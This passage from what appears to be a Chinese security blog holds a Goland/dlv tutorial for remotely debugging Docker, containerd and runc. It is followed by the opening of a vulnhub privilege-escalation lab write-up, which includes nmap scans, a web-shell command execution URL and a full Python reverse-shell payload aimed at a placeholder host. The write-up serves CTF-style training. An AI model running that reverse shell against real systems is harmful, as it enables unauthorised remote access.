class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@cloud_shoot /opt# tree -L 4 docker-*</span><br><span class="line">docker-cli</span><br><span class="line">└── src</span><br><span class="line">    └── github.com</span><br><span class="line">        └── docker</span><br><span class="line">            └── cli</span><br><span class="line">docker-containerd</span><br><span class="line">└── src</span><br><span class="line">    └── github.com</span><br><span class="line">        └── containerd</span><br><span class="line">            └── containerd</span><br><span class="line">docker-moby</span><br><span class="line">└── src</span><br><span class="line">    └── github.com</span><br><span class="line">        └── docker</span><br><span class="line">            └── docker</span><br><span class="line">docker-runc</span><br><span class="line">└── src</span><br><span class="line">    └── github.com</span><br><span class="line">        └── opencontainers</span><br><span class="line">            └── runc</span><br></pre></td></tr></table></figure><p>这里使用 Goland 进行远程开发，通过 ssh 连接，配置好后，（如果本机环境为Linux，则直接）打开两个IDE依次打开的项目文件夹为</p><ul><li>/opt/docker-moby/</li><li>/opt/docker-cli/ </li><li>/opt/docker-containerd/</li><li>/opt/docker-runc/</li></ul><p>非远程调试可跳过下面这步</p><h3 id="本地Goland-Go-SDK-设置"><a href="#本地Goland-Go-SDK-设置" class="headerlink" title="本地Goland Go SDK 设置"></a>本地Goland Go SDK 设置</h3><p>不管是不是远程，都需要设置本地Go SDK，否则运行的时候会挂在编译前的本地检查阶段</p><p><img src="/img/goland-docker-debug/image-20220812094507912.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220812094507912.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220812094507912"></p><p>一般本地安装好 Go 会自动识别，没有的话 <code>Add SDK</code> 指定本地安装目录或者 <code>Download..</code> 直接下载即可，版本和与一开始的Golang相同，尽量不要比一开始安装的Golang版本低即可</p><h3 id="远程调试环境搭建（本地可跳过此步骤）"><a href="#远程调试环境搭建（本地可跳过此步骤）" class="headerlink" title="远程调试环境搭建（本地可跳过此步骤）"></a>远程调试环境搭建（本地可跳过此步骤）</h3><p>顺便介绍下远程调试配置方法，新建一个空项目</p><p><img src="/img/goland-docker-debug/image-20220709125756637.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709125756637.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709125756637"></p><p>配置远程SFTP访问</p><p><img src="/img/goland-docker-debug/image-20220709130305721.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130305721.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130305721"></p><p><img src="/img/goland-docker-debug/image-20220709130320442.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130320442.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130320442"></p><p><img src="/img/goland-docker-debug/image-20220709130325363.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130325363.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130325363"></p><p>设置SSH连接信息</p><p><img src="/img/goland-docker-debug/image-20220709130333922.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130333922.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130333922"></p><p>设置远程项目部署目录，最后点击OK</p><p><img src="/img/goland-docker-debug/image-20220709130349846.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130349846.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130349846"></p><p><img src="/img/goland-docker-debug/image-20220709130535854.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709130535854.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709130535854"></p><p>最后从远程下载源码即可，新建项目时还有个 go.mod 是无用的，删除即可</p><h3 id="项目设置"><a href="#项目设置" class="headerlink" title="项目设置"></a>项目设置</h3><p>此部配置目的是为了让本地的Goland正确识别代码依赖</p><p>这里注意因为默认 Goland 开启 Go Module，要取消</p><p><img src="/img/goland-docker-debug/image-20220709133623468.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709133623468.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709133623468"></p><p>并添加项目 Project GOPATH</p><p><img src="/img/goland-docker-debug/image-20220709133634556.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709133634556.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709133634556"></p><h3 id="Go-Build设置-（本地可跳过此步骤）"><a href="#Go-Build设置-（本地可跳过此步骤）" class="headerlink" title="Go Build设置 （本地可跳过此步骤）"></a>Go Build设置 （本地可跳过此步骤）</h3><p>接下来配置远程Go环境，新建一个 Go Build 项目，注意 Run on 处选择SSH</p><p><img src="/img/goland-docker-debug/image-20220709131410962.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709131410962.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709131410962"></p><p>因刚刚我们配置了SFTP，直接在 Existing 中选择即可</p><p><img src="/img/goland-docker-debug/image-20220709131502912.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709131502912.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709131502912"></p><p>点击 Next，这一步报错无所谓，因为我远程用的是 fish shell，用 bash 的同学应该问题不大</p><p><img src="/img/goland-docker-debug/image-20220709131542038.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709131542038.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709131542038"></p><p>继续点Next即可， 确保下面红线框住的3处配置正确即可</p><p> <img src="/img/goland-docker-debug/image-20220709133146982.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709133146982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709133146982"></p><p>点击 Finish 即可</p><h3 id="调试-Go-包选择"><a href="#调试-Go-包选择" class="headerlink" title="调试 Go 包选择"></a>调试 Go 包选择</h3><p>配置Go 包为：github.com/docker/cli/cmd/docker，因为cli的入口为这个包，后面moby和containerd根据要调试的包选择即可。注意勾选下面的 <code>Build on remote target</code></p><p><img src="/img/goland-docker-debug/image-20220709133410841.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709133410841.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709133410841"></p><blockquote><p>PS: 这里 Run kind 一定要为 Package，因为Go包构建的基础单位就是包，而不是文件，这里如果 Build 文件也可以运行，因为当前入口 cmd 下，只有一个包，在 Build moby 时，如果 Build file 会报错（问了下ssst0n3师父）</p></blockquote><p>最终点击运行即可，观察运行的路径为远程路径</p><p><img src="/img/goland-docker-debug/image-20220709133759989.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709133759989.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709133759989"></p><p>点击运行右边的Debug按钮也可以正常运行，moby 和 containerd 服务的debug环境重复此步骤即可，不过有点注意事项</p><ol><li>要先启动 containerd 在启动 dockerd 服务，因为从架构图可知，dockerd 服务依赖于 containerd 服务，否则启动异常</li><li>启动 containerd 服务前，要保证本机装有 containerd-shim 和 runc，也是重复上面的步骤，go build 一下即可，从上面运行 cli 可知，运行默认指定了 -o 选项 <code>/opt/docker-cli/executables-4kyIqDG6jx/___10go_build_github_com_docker_cli_cmd_docker_linux</code> ，把cntainerd-shim和runc运行后的路径文件复制一份至 <code>/usr/bin</code> 之类的目录即可，containerd服务启动前默认从环境变量的可执行文件目录搜索，当然也可以通过指定参数指定路径</li><li>见【一些其他问题】章节中的第3点</li></ol><h3 id="containerd-shim-和-runc-debug-配置"><a href="#containerd-shim-和-runc-debug-配置" class="headerlink" title="containerd-shim 和 runc debug 配置"></a>containerd-shim 和 runc debug 配置</h3><p>至此，表面上远程Debug就这么轻松的完成了，凡事就怕有但是…</p><p>细心的同学看了0x02的架构图会发现，Containerd调Containerd-shim 是通过命令行调用的，Dockerd和Containerd好说，是HTTP和gRPC服务，直接Debug启动等待请求即可触发Debug，但命令行调用，不能事前Debug启动要咋整？一开始我用了最原始的print大法</p><p>后面看了下 ssst0n3 调 kubelet的文章<a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html"><sup>[3]</sup></a>  和搜狗团队对runc源码分析文章<a href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA"><sup>[4]</sup></a>，发现 Containerd-shim 和 runC 两个 cli 可以通过安装和启动 dlv ，通过 Goland 连接进行远程debug。原理是先写一个我们自定义的脚本替换 <code>/usr/bin/containerd-shim</code> 或 <code>runc</code>，里面包含了 dlv 启用相应命令 debug 服务监听，当 containerd 调用时，调用的是我们脚本，运行命令并阻塞在我们下的断点处，这时我们通过Goland remote debug连接即可</p><p>这里顺便给出具体的方法</p><p>设置源并安装 dlv，任意目录运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</span><br><span class="line">go install github.com/go-delve/delve/cmd/dlv@latest</span><br></pre></td></tr></table></figure><p>默认的 GOPATH 在 <code>家目录/go</code> 我这里安装到了 <code>/root/go/bin/dlv</code></p><p>到 <code>docker-runc/src/github.com/opencontainers/runc</code> 目录执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加调试信息，避免对一些函数进行优化内联造成调试困难</span></span><br><span class="line">make EXTRA_FLAGS=<span class="string">&#x27;-gcflags=&quot;all=-N -l&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>把编译出来的 runc 移动到默认环境变量找到的地方，方便其他组件调用，并写一个脚本通过 dlv 去调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mv runc /usr/bin/runc.debug</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;<span class="string">EOF &gt; /usr/bin/runc</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/root/go/bin/dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/runc.debug -- $*</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/runc</span><br></pre></td></tr></table></figure><p>Goland端配置</p><p><img src="/img/goland-docker-debug/image-20220709230931326.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709230931326.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709230931326"></p><p>containerd-shim 也是类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/docker-containerd-go/src/github.com/containerd/containerd/cmd/containerd-shim</span><br><span class="line">go build -gcflags=all=<span class="string">&quot;-N -l&quot;</span></span><br><span class="line"></span><br><span class="line">mv containerd-shim /usr/bin/containerd-shim.debug</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;<span class="string">EOF &gt; /usr/bin/containerd-shim</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/root/go/bin/dlv --listen=:2346 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/containerd-shim.debug -- $*</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/containerd-shim</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/docker-containerd-go/src/github.com/containerd/containerd/cmd/containerd-shim-runc-v2</span><br><span class="line">go build -gcflags=all=<span class="string">&quot;-N -l&quot;</span></span><br><span class="line"></span><br><span class="line">mv containerd-shim-runc-v2 /usr/bin/containerd-shim-runc-v2.debug</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;<span class="string">EOF &gt; /usr/bin/containerd-shim-runc-v2</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">/root/go/bin/dlv --listen=:2347 --headless=true --api-version=2 --accept-multiclient exec /usr/bin/containerd-shim-runc-v2.debug -- $*</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/containerd-shim-runc-v2</span><br></pre></td></tr></table></figure><p>此时我们通过 cli 发送一个请求，即可打通 dockerd containerd containerd-shim 和 runc 了</p><p><img src="/img/goland-docker-debug/image-20220709234327163.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220709234327163.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220709234327163"></p><h2 id="一些其他问题"><a href="#一些其他问题" class="headerlink" title="一些其他问题"></a>一些其他问题</h2><p>1、启动Dockerd问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed to start daemon: error while opening volume store metadata database: time out</span><br></pre></td></tr></table></figure><p>docker 没退出干净，看残留的docker进程，然后kill掉就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep docker</span><br></pre></td></tr></table></figure><p>2、可能在运行的Linux上原本通过metarget之类的安装了Docker或者K8S，但它们有的时候卸载不会把containerd和runc给卸载掉，因此搭建前最后确保这些卸载干净</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove containerd.io</span><br></pre></td></tr></table></figure><p>3、在搭建 dockerd 和 containerd 服务时候可能报错如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pkg-config --cflags  -- devmapper</span></span><br><span class="line">Package devmapper was not found <span class="keyword">in</span> the pkg-config search path.</span><br><span class="line">Perhaps you should add the directory containing `devmapper.pc<span class="string">&#x27;</span></span><br><span class="line"><span class="string">to the PKG_CONFIG_PATH environment variable</span></span><br><span class="line"><span class="string">No package &#x27;</span>devmapper<span class="string">&#x27; found</span></span><br><span class="line"><span class="string">pkg-config: exit status 1</span></span><br></pre></td></tr></table></figure><p>这是因为相关库没安装导致的，根据错误提示安装相应的依赖即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libdevmapper-dev</span><br></pre></td></tr></table></figure><p>除了这个包我还安装了这两个包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install pkg-config</span><br><span class="line">apt install libseccomp-dev</span><br></pre></td></tr></table></figure><p>缺的包跟操作系统有关，根据报错提示来就好啦～</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>[1] <a href="https://github.com/docker/docker-ce">https://github.com/docker/docker-ce</a></p><p>[2] <a href="https://www.docker.com/resources/what-container/">https://www.docker.com/resources/what-container/</a></p><p>[3] <a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/kubelet-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.html</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA">https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA</a></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> Docker </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> 云安全 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub Linux提权靶机 | escalate_linux_1</title>
      <link href="//p/2022/escalate-linux-1/"/>
      <url>//p/2022/escalate-linux-1/</url>
      
        <content type="html"><![CDATA[<p>我又来拔 flag了，忘了多久之间收在收藏夹里的靶机了… 之前一直想着汇总一下 linux 提权点，一直忘了，直到最近在备考 PTS，老师讲的没有给练习环境，然后有的点也没覆盖到，就想起这台尘封已久的靶机了，刚好可以巩固一下～</p><p>靶机链接：<a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a></p><p>先更改一下网络模式，默认为自动检测，我这里使用NAT，模拟真实环境中只知道某个网段不知具体IP情景</p><p><img src="/img/escalate-linux-1/image-20220330085924455.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220330085924455.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220330085924455"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描存活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sP 192.168.192.128/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 08:55 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.192.1</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.192.144</span><br><span class="line">Host is up (0.0050s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.192.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 9.26 seconds</span><br></pre></td></tr></table></figure><p>访问 192.168.192.144 为 apache ubuntu 的默认页面，与靶机介绍相符合</p><p>目录扫描发现 shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.192.144/shell.php</span><br></pre></td></tr></table></figure><p>端口扫描发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo nmap -p- -sS 192.168.192.144 --min-rate 1000</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 12:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.192.144</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">34637/tcp open  unknown</span><br><span class="line">45257/tcp open  unknown</span><br><span class="line">48491/tcp open  unknown</span><br><span class="line">58531/tcp open  unknown</span><br></pre></td></tr></table></figure><h2 id="获取低权限"><a href="#获取低权限" class="headerlink" title="获取低权限"></a>获取低权限</h2><p>命令执行，并发现出网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.192.144/shell.php?cmd=whoami</span><br></pre></td></tr></table></figure><p>反弹个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.192.144/shell.php?cmd=export RHOST=&quot;xxx.xxx.xxx.xxx&quot;;export RPORT=2233;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升 (1)"></a>权限提升 (1)</h2><h3 id="PEASS-ng-信息收集"><a href="#PEASS-ng-信息收集" class="headerlink" title="PEASS-ng 信息收集"></a>PEASS-ng 信息收集</h3><p>跑一下 <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a> </p><ul><li>sudo 1.8.21p2  </li><li>CVE-2021-4034</li><li>mysql root/root 密码已知 可尝试提权，但数据库是mysql用户启动</li><li>user3和user7 在 root 组</li><li>-rw-r–r– 1 root root 423 Jun  4  2019 /etc/exports<br>/home/user5 *(rw,no_root_squash)</li><li>当前用户可写文件</li></ul><p>/home/user3/.script.sh</p><h3 id="0x01-suid提权"><a href="#0x01-suid提权" class="headerlink" 